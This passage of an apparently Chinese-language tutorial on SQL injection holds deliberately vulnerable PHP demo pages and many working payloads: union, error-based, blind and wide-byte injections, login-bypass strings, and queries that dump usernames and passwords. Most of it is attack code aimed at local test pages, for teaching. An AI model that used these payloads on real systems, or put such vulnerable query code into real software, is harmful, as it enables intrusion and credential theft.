class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = mysql_fetch_row($result, MYSQL_ASSOC))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$row['tid']&#125;    &#123;$row['title']&#125;    &#123;$row['content']&#125;&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;1 union select 1,2,user() --</span><br></pre></td></tr></table></figure><p>没有回显可以尝试下看能不能报错注入,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;1 or updatexml(2,concat(0x7e,(version())),0) --</span><br></pre></td></tr></table></figure><p>也可以试下时间盲注,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;3 and sleep(3) --</span><br></pre></td></tr></table></figure><p>也可以试下bool盲注(看能不能引起页面变化):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;3 and (length(database()))&gt;10 --</span><br></pre></td></tr></table></figure><p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)。</p><p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p><h5 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h5><p>程序拼接的变量被引号包裹。字符型注入是是受php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义的函数影响的。如果程序没有对引号和关键字或者特殊符号过滤或者过滤不严,可能会导致sql注入。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$p = $_GET[<span class="string">'p'</span>]; p = <span class="number">100</span><span class="string">' and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">$sql = <span class="string">"select * from news where p = '3' and '1'='2'"</span>;</span><br></pre></td></tr></table></figure><p>闭合单引号,如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; union select 1,2,user() --</span><br></pre></td></tr></table></figure><p>闭合单引号,没有回显可以尝试下看能不能报错注入,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; or updatexml(2,concat(0x7e,(version())),0) --</span><br></pre></td></tr></table></figure><p>也可以试下时间盲注,比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; and sleep(5) --</span><br></pre></td></tr></table></figure><p>也可以试下bool盲注(看能不能引起页面变化):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; and (length(database()))&gt;10 --</span><br></pre></td></tr></table></figure><p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)</p><p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p><h5 id="按数据库返回的结果分类"><a href="#按数据库返回的结果分类" class="headerlink" title="按数据库返回的结果分类"></a>按数据库返回的结果分类</h5><p>据数据库返回的结果,分为回显注入、报错注入、盲注。</p><h5 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h5><p>可以直接在存在注入点的当前页面中获取返回结果,可以使用回显注入。</p><p>常见利用:</p><blockquote><p>union select</p></blockquote><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>程序将数据库的返回错误信息直接显示在页面中。虽然没有返回数据库的查询结果,但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p>常见利用:</p><blockquote><p>floor<br>updatexml<br>extractvalue</p></blockquote><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。</p><ul><li>bool盲注(based boolean)<ul><li>如果测试时发现页面有变化,可以尝试使用bool盲注</li></ul></li><li>时间盲注(based time)<ul><li>如果测试时页面无变化,但是通过sleep发现页面存在延迟,可以尝试使用时间盲注</li></ul></li></ul><p>利用:</p><ul><li>Length()、Substr()、Ascii()、sleep()、if(expr1,expr2,expr3)等结合使用</li></ul><h5 id="其他特殊注入"><a href="#其他特殊注入" class="headerlink" title="其他特殊注入"></a>其他特殊注入</h5><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>形成条件:</p><ul><li>开启了<code>gpc</code>或使用<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>等对引号转义的函数</li><li>使用了<code>SET NAMES 多字节编码</code>或者<code>set character_set_client=多字节编码</code>指令,这里多字节编码低位的范围需要覆盖0x5C才能导致注入。我们最常见的是<code>gbk</code>编码。</li></ul><p>假如代码中设置的是GBK编码(mysql那端表或者字段设置的编码无影响,会自动转换),这时只要引入宽字节高位编码吃掉<code>\</code>(%5c),就导致了宽字节注入的发生。</p><p>可以参考<a href="https://lyiang.wordpress.com/2015/06/09/sql注入：宽字节注入（gbk双字节绕过）/" target="_blank" rel="noopener">sql注入：宽字节注入(gbk双字节绕过)</a></p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS &#96;test&#96;;</span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;news&#96; (</span><br><span class="line">  &#96;tid&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;title&#96; varchar(30) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  &#96;content&#96; varchar(256) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;tid&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;3 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;news&#96; (&#96;tid&#96;, &#96;title&#96;, &#96;content&#96;) VALUES</span><br><span class="line">(1, &#39;新闻1&#39;, &#39;这是第一篇文章&#39;),</span><br><span class="line">(2, &#39;新闻2&#39;, &#39;这是第二篇文章&#39;);</span><br></pre></td></tr></table></figure><p>sqlgbkinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span> /&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$row['title']&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>测试:<br><code>http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23</code></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>首先将构造好的利用代码写入网站保存,再第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。</p><p>比如sql二次注入:</p><p>在第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>eg:<br>数据表使用的是上面news表</p><p>secondaryinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'tid'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123;</span><br><span class="line">    $tid = intval($_GET[<span class="string">'tid'</span>]);</span><br><span class="line">    $title = $_GET[<span class="string">'title'</span>];</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">        $title = addslashes($title);</span><br><span class="line">        $content = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"INSERT INTO news(tid,title,content) VALUES ($tid,'$title','$content')"</span>;</span><br><span class="line">    mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from news where tid=$tid"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $results = mysql_query($sql,$conn);</span><br><span class="line">    $row = mysql_fetch_array($results);</span><br><span class="line">    $_SESSION[<span class="string">'tid'</span>] = $row[<span class="string">'tid'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'title'</span>] = $row[<span class="string">'title'</span>];</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">'title'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'title'</span>]))&#123;</span><br><span class="line">    $title = $_SESSION[<span class="string">'title'</span>];</span><br><span class="line">    $sql = <span class="string">"select * from news where title='$title'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $results = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_array($results))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'title'</span>].<span class="string">'    '</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Try create a new'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/secondaryinjection.php?tid=6&amp;title=aaa%27 union select 1,user(),3%23&amp;content=qqqqq</code></p><p><code>http://127.0.0.1/secondaryinjection.php</code></p><h4 id="检测判断sql注入："><a href="#检测判断sql注入：" class="headerlink" title="检测判断sql注入："></a>检测判断sql注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1' and 1=0 //报错</span><br><span class="line">id=1' and 1=1 //正确</span><br></pre></td></tr></table></figure><h4 id="判断什么类型注入："><a href="#判断什么类型注入：" class="headerlink" title="判断什么类型注入："></a>判断什么类型注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1'</span><br><span class="line">id=1"</span><br></pre></td></tr></table></figure><p>可加 “\” 等符号，构造报错，从报错回显中观察是什么类型的错误，如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'our input'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=our <span class="keyword">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'out input'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> table_name <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">"our input"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12S2uT.png" alt="12S2uT.png"></p><p>原理如上</p><h4 id="数据库查询版本"><a href="#数据库查询版本" class="headerlink" title="数据库查询版本"></a>数据库查询版本</h4><ul><li>Mssql: select @@version</li><li>Mysql: select version（）/select @@version</li><li>oracle: select banner from ￥version</li><li>Postgresql: select version（）</li></ul><h4 id="判断过滤了哪些字符？"><a href="#判断过滤了哪些字符？" class="headerlink" title="判断过滤了哪些字符？"></a>判断过滤了哪些字符？</h4><p>采用异或注入。<br>在id=1后面输入 ‘(0)’<br>发现不出错，那就将0换成1=1<br>如果出错，那就是成功了</p><p>如果括号里面的判断是假的，那么页面就会显示正确<br>那么同理，<br>如果修改里面的内容为length(‘union’)!=0<br>如果页面显示正确，那就证明length(‘union’)==0的，也就是union被过滤了</p><h4 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h4><ul><li><h4 id="order-by-数字-可以判断字段的个数"><a href="#order-by-数字-可以判断字段的个数" class="headerlink" title="order by 数字 可以判断字段的个数"></a>order by 数字 可以判断字段的个数</h4></li><li>也可以用猜字段 union select 1，2，3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1' order by 1</span><br><span class="line">id=1' order by 2</span><br><span class="line">...</span><br><span class="line">id=1' order by n</span><br></pre></td></tr></table></figure><p>如果n出现了错误那么共有n-1列，union查询必须列数量对齐，也就是说union select 1,2,…,n-1 from …</p><h4 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h4><p>在链接后面添加语句<code>union select 1,2,3,4,5,6,7,8,9,10,11#</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。</p><h4 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h4><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union all <span class="keyword">select</span> <span class="keyword">version</span>()</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">database</span>()</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="keyword">user</span>()</span><br><span class="line">操作系统信息：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> @@global.version_compile_os <span class="keyword">from</span> mysql.user</span><br><span class="line">数据库权限：<span class="keyword">and</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span> 返回正常说明为root</span><br></pre></td></tr></table></figure><h4 id="绕过登陆验证"><a href="#绕过登陆验证" class="headerlink" title="绕过登陆验证"></a>绕过登陆验证</h4><ul><li>admin’ –</li><li>admin’ #</li><li>admin’/*</li><li>’ or 1=1–</li><li>’ or 1=1#</li><li>’ or 1=1/*</li><li>‘) or ‘1’=’1–</li><li>‘) or (‘1’=’1–</li></ul><h4 id="SQL注入常见函数"><a href="#SQL注入常见函数" class="headerlink" title="SQL注入常见函数"></a>SQL注入常见函数</h4><ul><li>group_concat函数 可以把查询的内容组合成一个字符串</li><li>load_file(file name ) 读取文件并将文件按字符串返回</li><li>left（string，length）返回最左边指定的字符数：</li><li>left（database（），1）&gt;‘s’ (猜名字)</li><li>length（）判断长度</li><li>length（database（）&gt;5</li><li>substr（a，b，c）从字符串a中截取 b到c长度</li><li>ascii（）将某个字符转为ascii值</li><li>ascii（substr（user（），1，1））=101#</li><li>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</li></ul><h4 id="联合爆库："><a href="#联合爆库：" class="headerlink" title="联合爆库："></a>联合爆库：</h4><p>这里假设有3列：</p><p>为了让联合注入工作，首先要知道数据库中的表名，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+ //--+是把语句闭合后注释掉后面的语句</span></span><br></pre></td></tr></table></figure><p>有时程序可能不会打印出所有的行，这时我们就得使用关键字limit一条条进行查询，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+</span></span><br></pre></td></tr></table></figure><p>或者可以用group_concat():</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>假设有’users’表</p><p>现在看其中的一个表，为了提取其信息，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>注意，我们使用’column’替换了’table’，因为我们想要的是一个表的列信息<br>假设有’username’，’password’，’flag’列，我们可以键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select 1,group_concat(username),group_concat(password) from users --+</span></span><br><span class="line"><span class="string">id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>即可按需查询所需要的信息。</p><h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">- floor （<span class="keyword">SELECT</span> <span class="keyword">user</span>()可修改）</span><br><span class="line"></span><br><span class="line">- <span class="keyword">OR</span> (<span class="keyword">SELECT</span> <span class="number">8627</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x70307e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e7030</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)–+</span><br><span class="line">  </span><br><span class="line">- ExtractValue(有长度限制,最长<span class="number">32</span>位) （<span class="keyword">select</span> @@<span class="keyword">version</span>可修改）</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))–+</span><br><span class="line"></span><br><span class="line">- UpdateXml(有长度限制,最长<span class="number">32</span>位) （<span class="keyword">SELECT</span> @@<span class="keyword">version</span>可修改）</span><br><span class="line"></span><br><span class="line">  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">NAME_CONST</span>(适用于低版本，不太好用)</span><br><span class="line"></span><br><span class="line">- <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>)) <span class="keyword">as</span> x)–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">Error</span> based <span class="keyword">Double</span> <span class="keyword">Query</span> Injection</span><br><span class="line"></span><br><span class="line">- <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat_ws</span>(<span class="number">0x7e</span>,<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">having</span> <span class="keyword">min</span>(<span class="number">0</span>) <span class="keyword">or</span> <span class="number">1</span>–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">exp</span>(<span class="number">5.5</span><span class="number">.5</span>以上) （<span class="keyword">select</span> <span class="keyword">user</span>()可修改）</span><br><span class="line"></span><br><span class="line">- <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)))–+</span><br><span class="line"></span><br><span class="line">- <span class="keyword">floor</span>(Mysql): <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x </span><br><span 